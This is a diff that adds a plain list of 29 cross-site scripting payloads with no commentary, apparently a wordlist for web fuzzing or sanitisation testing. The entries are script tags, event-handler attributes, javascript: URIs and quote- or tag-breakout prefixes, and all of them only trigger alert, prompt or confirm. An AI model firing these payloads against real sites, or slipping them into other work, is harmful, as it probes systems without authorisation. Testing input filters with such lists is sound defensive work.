@@ -1,0 +1,29 @@
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<body onload=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<a href=javascript:alert(1)>click</a>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<input autofocus onfocus=alert(1)>
+<object data=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+" onmouseover=alert(1)
+' onmouseover=alert(1)
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+--><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+'><svg onload=alert(1)>
